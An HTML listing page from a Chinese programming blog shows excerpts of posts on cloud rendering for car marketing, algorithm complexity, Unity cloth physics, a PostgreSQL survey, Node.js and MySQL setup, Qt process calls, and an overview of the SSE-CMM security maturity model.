<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f40e639a18cdd865a6a78463db3a3ed5/" rel="bookmark">
			引领汽车营销新趋势，3DCAT实时云渲染助力汽车三维可视化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当前，汽车产业发展正从电动化的上半场，向智能化的下半场迈进。除了车机技术体验的智能化之外，观车体验的智能化也不容忽视。
这是因为，随着数字化、智能化、个性化的趋势，消费者对汽车的需求和期待也越来越高，他们希望能够通过多种渠道和方式，全方位、沉浸式地体验汽车的外观、内饰、性能和功能，以及进行个性化的定制和选择。
然而，传统的汽车营销形式，如汽车视频广告、全景看车、WebGL看车等，存在以下几个问题：
交互性低：传统的汽车营销形式以视频、图片为主，内容均为单向输出，缺乏互动性，无法真正与消费者进行互动和交流。
覆盖率低：营销渠道主要集中在传统媒体和线下活动，覆盖面相对有限，难以覆盖到更广泛的受众。
用户体验差：传统渲染加载速度慢，且无法满足高质量渲染的应用场景，影响用户的体验，降低用户的满意度。
终端效果不一：传统渲染方式的渲染质量和精度受限于算法和计算资源，无法保证在不同硬件配置的终端上呈现一致的效果。
设备成本大：本地化部署设备管理难、成本高、一次性设备投入成本大。
为了解决这些问题，瑞云科技推出了3DCAT实时渲染云平台。3DCAT实时渲染云平台是一种基于云计算理念的视觉云应用解决方案。它将三维应用部署在云端运行，云端资源进行图形数据的实时计算和输出，并把运行结果以“流”（Streaming）的方式推送到终端呈现。终端用户可随时随地交互式访问各种三维应用。
01 3DCAT六大优势，助力汽车三维可视化 为何选择使用3DCAT实时云渲染交互看车，以下六个优势给您答案：
01 轻量化体验 支持手机/Pad/笔记本电脑/PC/XR设备等轻量化终端随时随地访问。
02 高交互性 全方位展示汽车车型，并提供更多自定义选配项，满足用户多样化的产品定制需求。
03 全渠道传播 无需安装任何程序及插件，一键生成链接快速分享，或者将其灵活嵌入官网、APP、小程序以及各类宣传网页，全渠道曝光汽车品牌形象，降低内容制作成本。
04 高清晰度 可提供更高的渲染质量和精度，更真实地呈现汽车的外观和内部细节，保证任意终端接收效果一样。
05 高速传输 通过云渲染预加载技术，实现应用秒级打开，用户无需等待，即开即用。
06 高安全性 通过云端渲染和传输技术，保护源文件的知识产权，防止数据泄露和盗用。
02 线上线下营销场景双助力，助力汽车营销腾飞 01 线上营销场景 该方案可以应用于多个线上营销场景，为用户提升营销效果，支持多种类型终端进行访问，实现无差异化营销。例如：
多渠道云展厅，增加曝光量：
在抖音等直播平台、天猫看车等电商平台里可以进行多维度多渠道全方位展示，增加曝光量，占据巨大的流量入口。
车型总览承接流量，精准分流：
将流量直接快速的分流至各车型全景看车页面尽可能减少客户流失
全景看车车型介绍，转化客户：
在浏览的基础上强化“预约试驾”“下定”等转化操作；预留特约店及销售联系方式，线上线下结合；与“云聊车+”联通，客户可直接在线咨询
云聊车+在线咨询，引流到店：
通过在线语音咨询服务，将客户引导至特约店；云聊车+内增加预约试驾功能，引导用户直接转化
02 线下营销场景 该方案也可以应用于多个线下营销场景，为用户提供数字化的用户体验，加深品牌时尚科技的印象，增加品牌影响力和销售机会。例如：
汽车展览会：
汽车厂商可以利用该方案展示他们的新车型、新技术和服务，与消费者面对面交流互动，增加品牌影响力和销售机会。
试驾活动：
汽车厂商可以利用该方案展示他们的车辆性能和特点，同时向潜在客户提供购车咨询和服务。
4S店：
4S店可以利用该方案提供产品展示、试驾、购车咨询和售后服务等多种服务，为消费者提供全面的汽车购买和使用体验。
汽车论坛峰会：
汽车厂商可以利用该方案分享他们的经验、技术和服务，增加品牌影响力和市场份额。
03 品牌升级，销售转化：3DCAT实时渲染云平台汽车案例 3DCAT实时渲染云平台已经为多个汽车品牌提供了视觉云应用解决方案，如广汽传祺、奥迪、雷克萨斯、东风日产等。
这些品牌通过3DCAT实时渲染云平台，实现了线上线下的无缝连接，为消费者提供了沉浸式的看车体验，提升了品牌影响力和销售转化率。以下是一些客户案例的介绍：
01 广汽传祺
3DCAT为广汽传祺打造了一款云渲染3D高清看车平台，让消费者可以在手机、电脑、微信小程序等多种终端上，实现对广汽传祺E9的全方位、高清晰、高还原度的观看和体验。
02 奥迪
上汽奥迪与3DCAT实时渲染云建立了长期深度合作，为上汽奥迪4S店新零售产品配置器提供了公有云实时云渲染展示解决方案。通过联动巨大的高清屏幕以及3DCAT实时渲染云技术，触摸式配置器可沉浸式还原上汽奥迪车型细节，并将诸多高科技配置、多样化选装包一一呈现在客户面前。
03 东风日产
3DCAT为东风日产全新天籁线上个性化订车提供实时云渲染展示解决方案，用户可以在任何联网的设备上，通过浏览器或微信小程序访问全新天籁的3D模型，进行自由旋转、缩放、换色、内饰查看等操作，感受全新天籁的精致细节和高品质设计。
04 如何使用3DCAT汽车三维可视化解决方案 关注3DCAT实时渲染云，注册获价值30圆实时云渲染无门槛券。若您已是3DCAT用户，想体验汽车三维可视化，获得更专业的一对一服务，欢迎与我们联系，我们会有专人为您提供服务。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f40e639a18cdd865a6a78463db3a3ed5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8db5f3879c77ac38b6755f9a3729f80e/" rel="bookmark">
			【数据结构开篇 --- 时间和空间复杂度】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据结构学习笔记---001 数据结构开篇1、介绍数据结构及算法1.1、什么是数据结构?1.2、什么是算法? 2、数据结构的重要性3、如何衡量一个算法的好坏？3.1、算法效率3.2、时间复杂度3.3、空间复杂度 4.时间复杂度和空间复杂度，巩固练习4.1、练习题1：移除元素4.2、练习题2：反转数组 数据结构开篇 前言：
什么是程序？程序 = 算法 + 数据结构
可想而知对于一个完整的程序来说，数据结构的重要性；对于一个好的程序，数据结构能让我们更深层次的理解。
/知识点汇总/
1、介绍数据结构及算法 1.1、什么是数据结构? 数据结构是计算机存储，组织数据的方式，指相互之间存在一种或多种特定关系的数据元素的集合。
1.2、什么是算法? 算法就是定义良好的计算过程，他取一个或一组的值为输入，并产生出一个或一组值作为输出。
简单说算法就是一系列的计算步骤，用来将输入数据转化为输出结果。
2、数据结构的重要性 数据结构是计算机科学中非常重要的一部分，它提供了存储和组织数据的方法和技术。 数据结构在计算机科学领域中经常用于解决许多不同类型的问题，包括信息搜索、排序、过滤等。
使用正确的数据结构可以使算法更加有效和高效，并且可以节省大量的计算资源。 数据结构也被广泛用于数据库、编译器、操作系统等领域中。
在数据库中，数据结构可以用来存储和管理大量的数据，并且可以支持数据的查询和更新等操作。
在编译器中，数据结构可以用来存储和管理程序的符号表和语法树等信息。
而在操作系统中，数据结构可以用来实现进程管理、文件系统和网络通信等功能。
掌握数据结构是计算机科学领域中的基础技能之一，它可以使程序员更好地理解和应用算法，并且可以使他们写出更高效、更可维护的代码。
3、如何衡量一个算法的好坏？ 从数据结构角度理解分为：
(1).算法效率
(2).时间复杂度
(3).空间复杂度
3.1、算法效率 算法效率，如何衡量一个算法的好坏？
从算法的复杂度分析：
一般是从时间和空间两个维度来衡量的，即时间复杂度和空间复杂度；
时间复杂度主要衡量一个算法的运行快慢，而空间复杂度主要衡量一个算法运行所需要的额外空间。
3.2、时间复杂度 概念：从计算机科学中，算法的时间复杂度是一个函数，它定量描述了该算法的运行时间。
从理论上说，是计算不出来的，因为只有跑程序才能知道，所以一个算法所花的时间与其中语句执行的次数成正比例；
即算法中的基本操作的执行次数，为算法的时间复杂度。
简言之，对于一个程序来说，找到该程序的基本语句与问题规模之间的表达式，就能算出该算法的时间复杂度(估算值)。
举例1：
void fun1(int N) { int count = 0; for (int i = 0; i &lt; N; i++) { for (int j = 0; j &lt; N; j++) { ++count; } } for (int k = 0; k &lt; 2*N; ++k) { ++count; } int M = 10; while (M--) { ++count; } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8db5f3879c77ac38b6755f9a3729f80e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c2e1a1a5fa33c61cde8ed5c181bdb8f/" rel="bookmark">
			Unity布料系统Cloth
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity布料系统Cloth 介绍布料系统Cloth(Unity组件)组件上的一些属性布料系统的使用布料约束Select面板Paint面板Gradient Tool面板 布料碰撞布料碰撞碰撞适用 介绍 布料系统我第一次用是做人物的裙摆自然飘动，当时我用的是UnityChan这个unity官方自带的插件做的裙摆和人物胸部的自然摆动，还有一个插件是Obi Cloth也是用来做布料的。Unity的Cloth也是才看到有这么个组件的，这篇文章我会讲一下Unity官方Cloth的操作，Obi Cloth放到后面来讲一下。
布料系统Cloth(Unity组件) 创建一个空物体在空物体上添加组件Cloth，Cloth组件会自动给空对象添加Skinned Mesh Renderer
不显示网格和材质是因为没有添加材质球和网格，选择下图红框基础网格和材质
组件上的一些属性 bendingStiffnessBending stiffness of the cloth.弯曲刚度布料的弯曲刚度capsuleCollidersAn array of CapsuleColliders which this Cloth instance should collide with.胶囊碰撞机此 Cloth 实例应与其发生碰撞的 CapsuleColliders 数组clothSolverFrequencyNumber of cloth solver iterations per second.布料解算器频率每秒布料解算器迭代次数coefficientsThe cloth skinning coefficients used to set up how the cloth interacts with the skinned mesh.系数布料蒙皮系数用于设置布料与蒙皮网格的交互方式collisionMassScaleHow much to increase mass of colliding particles.碰撞质量尺度碰撞粒子的质量增加多少dampingDamp cloth motion.阻尼阻尼值enableContinuousCollisionEnable continuous collision to improve collision stability.启用连续碰撞启用连续碰撞以提高碰撞稳定性enabledIs this cloth enabled?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c2e1a1a5fa33c61cde8ed5c181bdb8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/174ec894cb560dd21c052311dd067f46/" rel="bookmark">
			全面解读《State of PostgreSQL 2023》报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文由 Cloudberry Database 社区根据 Timescale 发布的 2023 年最新《State of PostgreSQL》英文版报告整理而成。
《State of PostgreSQL》是由 Timescale 2019 年开始发起的一项 PostgreSQL 社区问卷调查，到今年已经进行了四年，问卷涉及受访者信息如区域、职位/工作状态、贡献经历，以及 PostgreSQL 使用场景与扩展/插件、所用可视化工具等。今年 ChatGPT 引发新一轮 AI 热潮，本次问卷也征集了受访者使用 PostgreSQL 处理 AI 和大模型工作负载的态度与获益。
本问卷调查持续了近两个月，共 888 人参与填写。由问卷整理出炉的报告内容丰富，为我们了解 PostgreSQL 社区提供了数据支撑。
一、受访者状况 你来自哪儿？ 从 2021 年和 2022 年调查结果来看，EMEA（欧洲、中东、非洲）区域受访者几乎占一半，但今年看到 APAC（亚太地区）受访者增至 20.3%，较去年（11%）上升 9.3 个百分点。
你在技术部门工作多久了？ 结果显示，81% 左右的 PostgreSQL 受访用户行业经验都在 6 年以上，从业 20 年以上的占比 32.4%。
你目前的职位是什么？ 在 2023 年，软件开发人员/工程师的占比没有发生巨大变化──从去年的 43.3% 到 2023 年的 46.1%。今年的问卷对软件工程师这一笼统概念做了细分，分为前端工程师、后端工程师、全栈工程师和管理人员（包括 CxO、VP、总监和创始人）四类。细分之后发现 28.3% 受访者是后端开发人员，17.8% 是全栈开发人员。2023 年软件架构师参与更少，从 13.2%下降到 6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/174ec894cb560dd21c052311dd067f46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37c83c5bcaac72f6fdbea88e140c269d/" rel="bookmark">
			机器学习笔记（一）从波士顿房价预测开始，梯度下降
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从波士顿房价开始 目标 其实这一章节比较简单，主要是概念，首先在波士顿房价这个问题中，我们假设了一组线性关系，也就是如图所示
我们假定结果房价和这些参数之间有线性关系，即:
然后我们假定这个函数的损失函数为均方差，即：
那么就是说，我们现在是已知y和x，来求使得这个损失函数Loss最小化的一个w和b的组合
读取数据 点击查看代码 def load_data(): # 从文件导入数据 datafile = './work/housing.data' data = np.fromfile(datafile, sep=' ') # 每条数据包括14项，其中前面13项是影响因素，第14项是相应的房屋价格中位数 feature_names = [ 'CRIM', 'ZN', 'INDUS', 'CHAS', 'NOX', 'RM', 'AGE', \ 'DIS', 'RAD', 'TAX', 'PTRATIO', 'B', 'LSTAT', 'MEDV' ] feature_num = len(feature_names) # 将原始数据进行Reshape，变成[N, 14]这样的形状 data = data.reshape([data.shape[0] // feature_num, feature_num]) # 将原数据集拆分成训练集和测试集 # 这里使用80%的数据做训练，20%的数据做测试 # 测试集和训练集必须是没有交集的 ratio = 0.8 offset = int(data.shape[0] * ratio) training_data = data[:offset] # 计算训练集的最大值，最小值 maximums, minimums = training_data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37c83c5bcaac72f6fdbea88e140c269d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57ff829514dca3530eefcb8a97a6f96b/" rel="bookmark">
			Linux ulimit配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux ulimit配置 1. 简介 在Linux系统中，ulimit是一个强大的工具，用于控制用户进程可以使用的资源。然而，有时候我们可能会遇到需要关闭或者调整这些资源限制的情况，以满足特定需求。本文将介绍如何关闭Linux系统中的ulimit限制，使得进程能够更自由地利用系统资源。
2. 常用命令 查看配置
ulimit -a 输出
real-time non-blocking time (microseconds, -R) unlimited core file size (blocks, -c) unlimited data seg size (kbytes, -d) unlimited scheduling priority (-e) 0 file size (blocks, -f) unlimited pending signals (-i) 30446 max locked memory (kbytes, -l) unlimited max memory size (kbytes, -m) unlimited open files (-n) 65535 pipe size (512 bytes, -p) 8 POSIX message queues (bytes, -q) 819200 real-time priority (-r) 0 stack size (kbytes, -s) 10240 cpu time (seconds, -t) unlimited max user processes (-u) 65535 virtual memory (kbytes, -v) unlimited file locks (-x) unlimited 临时配置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57ff829514dca3530eefcb8a97a6f96b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2243fd669be5e94b4fc3250a4037d341/" rel="bookmark">
			Vue中转换HTML为PDF
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 安装html2pdf.js库
npm install html2pdf.js 2. 组件中引入html2pdf.js库
import html2pdf from 'html2pdf.js' 3. 创建方法来处理HTML转PDF的逻辑
export default { methods: { convertHTMLToPDF() { const element = document.getElementById('html-content'); // 获取包含HTML内容的元素 const pdf = html2pdf().fromHTML(element, { margin: 1, // 设置边距（以毫米为单位） filename: 'example.pdf', // 设置生成的PDF文件名 image: { type: 'jpeg', quality: 0.98 }, // 设置图片质量 html2canvas: { dpi: 192, letterRendering: true }, // 设置canvas渲染选项 jsPDF: { unit: 'in', format: 'letter', orientation: 'portrait' }, // 设置生成的PDF的单位、格式和方向 }); pdf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2243fd669be5e94b4fc3250a4037d341/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c626266a34815fecbdb568b032fd8103/" rel="bookmark">
			js 现在的时间距离本月月底的倒计时(html)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现在的时间距离本月月底的倒计时 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;现在的时间距离本月月底的倒计时&lt;/title&gt; &lt;style&gt; body { padding: 0; margin: 0; } .index-time { color: #333333; text-align: left; font-size: 28px; line-height: 80px; width: 550px; margin: 0 auto; } .index-date { color: #ff5722; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="index-time"&gt; &lt;div class="index-date" id="date"&gt;&lt;/div&gt; &lt;div class="index-date" id="reachDate"&gt;&lt;/div&gt; &lt;div class="index-time-son"&gt; &lt;div class="time-son-m" id="timer"&gt; 距离指定日期： &lt;span class="time-hei time-hei1"&gt;00&lt;/span&gt; 天 &lt;span class="time-hei time-hei2"&gt;00&lt;/span&gt; 小时 &lt;span class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c626266a34815fecbdb568b032fd8103/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42ae4297504470ba1b88a59a013adb8d/" rel="bookmark">
			09-网络安全框架及模型-（SSE-CMM）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
SSE-CMM模型
1 背景概述
2 模型架构
3 主要内容
4 成熟度级别
5 过程领域
6 通用实践
7 能力目标
8 评估方法
9 优势和局限性
SSE-CMM模型 1 背景概述 SSE-CMM（Systems Security Engineering Capability Maturity Model）诞生的背景可以追溯到上世纪90年代初，当时信息技术的快速发展和普及导致了对系统安全的日益关注。随着计算机网络的广泛应用和互联网的兴起，各种安全威胁和攻击也开始显现出来，这使得对系统安全工程能力的评估和提升变得尤为重要。
在这样的背景下，美国国防部首先意识到了对系统安全工程能力的重要性，并开始着手开发一种能够评估和指导系统安全工程的成熟度模型。1995年，美国国防部资助了Carnegie Mellon大学的软件工程研究所（SEI）进行了一项名为“系统安全工程成熟度模型”的研究项目，旨在制定一种适用于各类组织的系统安全工程成熟度评估模型。
经过数年的研究和实践，SEI于2001年发布了第一个版本的SSE-CMM。该模型结合了CMMI（Capability Maturity Model Integration）和其他安全标准，提出了一套评估系统安全工程能力的框架，以帮助组织评估其安全工程实践，并指导其改进和提升。
SSE-CMM的诞生背景可以概括为对日益复杂和普遍的计算机系统安全问题的关注，以及对组织在面对安全挑战时需要明确的指导和方法论的需求。通过SSE-CMM，组织能够更好地理解和提升其系统安全工程能力，以更有效地保护信息系统、数据和网络资源。
2 模型架构 SSE-CMM（Systems Security Engineering Capability Maturity Model）是一个针对系统安全工程能力的成熟度评估模型。它旨在帮助组织评估和改进其系统安全工程的能力。
SSE-CMM包括三个主要的过程类别：
工程过程类（Engineering Processes）：这个类别关注的是在系统开发、设计和实施过程中采取的安全工程措施。它包含了一系列的工程实践，以确保在整个生命周期中综合考虑和应用安全性。这些实践可以涉及需求分析、系统设计、编码实施、测试验证以及配置和部署等方面。
组织过程类（Organizational Processes）：这个类别关注的是组织本身的安全管理和实践。它包含了安全政策、安全培训、风险管理、安全度量和监控等方面的实践。组织过程类的目标是确保组织在系统安全方面具备适当的管理结构和流程。
项目过程类（Project Processes）：这个类别关注的是在特定项目中实施系统安全工程的过程。它包括项目规划、风险管理、需求管理、安全评估和验证等方面的实践。项目过程类的目标是确保在项目层面上采取适当的安全措施并满足特定的安全要求。
通过评估和改进这三个过程类别，组织可以提高其系统安全工程能力，并向更高成熟度的级别发展。SSE-CMM提供了一种结构化的方法来帮助组织识别其安全工程的现状，并制定相应的改进计划，以提高系统安全性和应对安全威胁。
3 主要内容 SSE-CMM（Systems Security Engineering Capability Maturity Model）的组成部分主要包括五个方面：
成熟度级别（Maturity Levels）：SSE-CMM定义了一套由初始级别到优化级别的五个成熟度级别，分别为初始（Initial）、可重复（Repeatable）、已定义（Defined）、已管理（Managed）和已优化（Optimizing）。这些级别描述了组织系统安全工程能力的不同发展阶段，从无序、反应式的状态逐步发展到系统化、持续改进的状态。
过程领域（Process Areas）：SSE-CMM将系统安全工程能力划分为若干个过程领域，每个过程领域描述了系统安全工程中的一个关键方面，如安全需求分析、安全架构设计、安全测试等。这些过程领域提供了组织评估其系统安全工程实践的具体标准和指导。
通用实践（Common Practices）：SSE-CMM包含一系列通用实践，这些实践跨越多个过程领域，为组织提供了在系统安全工程中普遍适用的建议和指导。通用实践涵盖了安全管理、风险评估、安全培训等方面。
能力目标（Capability Goals）：针对每个成熟度级别，SSE-CMM定义了相应的能力目标，描述了组织在该级别应该具备的系统安全工程能力。这些能力目标可以帮助组织理解并评估自身的发展水平，并制定相应的改进计划。
评估方法（Assessment Method）：SSE-CMM提供了一套评估方法，用于组织自我评估或接受外部评估，以确定其在系统安全工程能力方面的成熟度水平。这些评估方法包括了评估框架、评估指南和评估工具等，帮助组织进行全面的自评和审查。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42ae4297504470ba1b88a59a013adb8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4cf0e812f41f7e5bdd55c6141176ab3a/" rel="bookmark">
			nodejs安装指导教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.nodejs下载 去官网下载对应的安装包即可
2.安装 下载的文件如果是exe文件直接安装，在弹出指导安装的界面有个addpath，可以将其勾选上，免得再去系统的环境变量中添加该属性。达成的效果就是，让npm命令到文件各个地方都可以被使用。
3.验证是否安装成功 npm -V (-V 必须大写) 且可以在非管理员运行的cmd中执行该命令
4.修改模块下载位置 安装成功后，获取默认的cache和prefix、
npm get prefix
npm get cache
为了统一管理方便和后期维护考虑，所以在这里将两份文件地址进行搬家，建议安装在nodejs的安装目录下，所以在nodejs的安装目录下新建node_global、node_cache，并通过命令指明，文件位置已经更换。
npm config set prefix "C:\applicationloadPath\nodejsPath\node_global"
npm config set cache "C:\applicationloadPath\nodejsPath\node_cache"
可以用命令验证下是不是更换成功了
npm get prefix
npm get cache
测试一下是否更改成功，这里请注意，前面我们都可以用cmd进行执行，现在要用管理员运行的cmd才可以执行成功
npm install express -g --loglevel=verbose
5.设置淘宝镜像 npm config get registry 默认的镜像地址:https://registry.npmjs.org/
将默认的换成淘宝的：npm config set registry https://registry.npm.taobao.org/
现在安装cnpm:npm install -g cnpm --registry=https://registry.npm.taobao.org
验证是否安装成功
cnpm -v
扩展知识 利用nodjs安装vue项目
npm install vue -g npm install vue-router -g npm install vue-cli -g 利用cmd 输入VUE -v 检查是否安装成功
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4cf0e812f41f7e5bdd55c6141176ab3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/060078eacc4b8a3451f3d91f76e1da80/" rel="bookmark">
			QT调用外部exe及无终端弹窗的解决方案、并实现进程输出信息获取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主使用QT调用外部exe程序，外部exe程序有printf输出，起初使用的是C语言中的system()方法，但在笔记本上有概率出现终端窗口一闪而过的情况，后修改了调用方案。
1. QT调用外部exe 使用QT中的QProcess方法
#include &lt;QProcess&gt; QProcess process; QString cmd ="../test.exe 1 2"; process.start(cmd); // 启动可执行程序 process.startDeteched(cmd); process.execute(cmd); 注意，此处启动可执行程序的方式有3种：
start：外部程序启动后，将随主程序的退出而退出startDeteched：外部程序启动后，当主程序退出时并不退出，而是继续运行。execute：带阻塞 2. 无终端弹窗的解决方案 QProcess方法默认是无弹窗的，要想弹窗，需做如下设置：
QProcess process(this); process.setCreateProcessArgumentsModifier( [](QProcess::CreateProcessArguments *args) { args-&gt;flags |= CREATE_NEW_CONSOLE; args-&gt;startupInfo-&gt;dwFlags &amp;= ~STARTF_USESTDHANDLES; args-&gt;startupInfo-&gt;dwFlags |= STARTF_USEFILLATTRIBUTE; args-&gt;startupInfo-&gt;dwFillAttribute = BACKGROUND_BLUE | FOREGROUND_RED | FOREGROUND_INTENSITY; // 定义终端背景及字体等颜色，可不指定. }); process.start("../test.exe 1 2"); process.waitForStarted(); // 等待子进程执行结束 process.waitForFinished(); // process.close(); // 强制关闭子进程 注意，此处不能使用execute方法，否则无效。对于CREATE_NEW_CONSOLE等关键字，不是QT本身定义的内容，其被定义在Windows.h头文件中，所以需要包含该头文件。
3. 实现进程输出信息的获取 使用readAll()或者readAllStandardOutput()方法实现，案例如下：
#include &lt;QProcess&gt; #include &lt;QTextCodec&gt; QProcess process; process.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/060078eacc4b8a3451f3d91f76e1da80/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/732ce873d8347a70105e79cbb0e7e163/" rel="bookmark">
			计算机体系结构实验——Branch-Target Buffers
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实验五 Branch-Target Buffers 本次实验的主要目的是加深对Branch-Target Buffers的理解。掌握使用Branch-Target Buffers减少或增加分支带来的延迟的情况。
实验内容： 将以下程序段修改为可利用WinMIPS64模拟器运行的程序。假设R3的初始值为R2+40
在使用forwarding的情况下，对比采用BTB与不采用BTB技术时流水线的变化。重点分析两种情况下每次循环的stall周期数，都是由什么原因造成的？重点分析与分支指令相关的stall。采用BTB技术时何时能够减少分支指令带来的暂停？何时会增加暂停？为什么？
实验报告:
将程序段3修改为WinMIPS64模拟器可以运行的程序如下：
.text main: DADDI R3,R2,40; Loop: LW R1,0(R2) DADDI R1,R1,1 SW R1,0(R2) DADDI R2,R2,4 DSUB R4,R3,R2 BNEZ R4,Loop end: halt 在使用forwarding，不使用BTB技术的情况下造成的暂停以及原因介绍如下：
数据相关：
1、由于LW指令取数放入R1中在Mem阶段才能到内存中取到数值，而下一条指令需要使用到R1寄存器的数值，存在RAW相关会造成一个周期的暂停
2、由于DSUB那条指令最后要将结果写到R4中并且在EX阶段结束后才能获得存放到R4中的数值，而跳转指令需要在ID阶段判断是否要跳转，所以会产生RAW相关，暂停一个周期
控制相关：
3、由下图红框中的指令可以看出，它在处理跳转指令的时候采用的是预测转移失败的行为，但在实际指令运行过程中，指令成功转移，所以会清空流水线，重新取指令，造成一个周期的暂停
在使用forwarding技术，并且使用BTB技术的情况下造成的暂停以及原因介绍如下：
数据相关：
由于在这种情况下所产生的数据相关与不使用BTB的情况下的数据相关相同，所以不再加以介绍
结构相关：
1、在第一次循环结束时，由于BTB表为空，预测为转移失败，但实际转移成功。所以在ex段执行中会将转移指令地址连同下一条指令的pc值放入BTB中，并且清空流水线，重新取指执行，造成两个周期的暂停。
2、在第二次循环以及后续的八次循环中，由于该条跳转指令在IF段会查找BTB表，并且会在表中查到对应的指令的地址，所以会预测转移成功，并且将转移地址放入PC中，因此不存在结构相关，不会造成暂停。
3、在最后一次循环时，由于BTB表中存在对应跳转指令的地址，所以会预测转移成功，但实际上会转移失败，所以会在转移指令的EX阶段中删除BTB表中对应的表项，同时在ex阶段执行结束后会清空流水线重新取指来运行，造成两个周期的暂停。
由以上可以发现在：
预测正确的时候可以减少暂停：跳转指令在IF阶段会查找BTB表，如果查找到会将下一条指令的地址放入PC寄存器中。如果预测正确则可以在下一个周期就开始下一条指令的取指阶段，而不需要等待跳转指令的ID段执行结束才能执行下一条指令的取指阶段。
预测错误时会增加暂停：由上述程序第一个阶段和最后一个可以看到，如果预测失败，不仅要清空流水线还要修改BTB表中存储的指令地址以及下一条指令的PC值，会造成两个周期的暂停。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16ef653cd2a8de5ade2024b823d42f02/" rel="bookmark">
			MySQL——Ubuntu20使用deb安装MySQL&amp;远程连接数据库服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL的下载和安装 1. 下载 进入MySQL官网进行下载：MySQL官网下载地址
下载的文件默认放到Home/Downloads目录下
我这里选择了跟 系统版本及CPU架构对应 8.0.26 Ubuntu20.04 x86_64bit 版本进行了下载：mysql-server_8.0.26-1ubuntu20.04_amd64.deb-bundle.tar
不清楚自己的系统版本和CPU架构的可以通过一下指令查看：
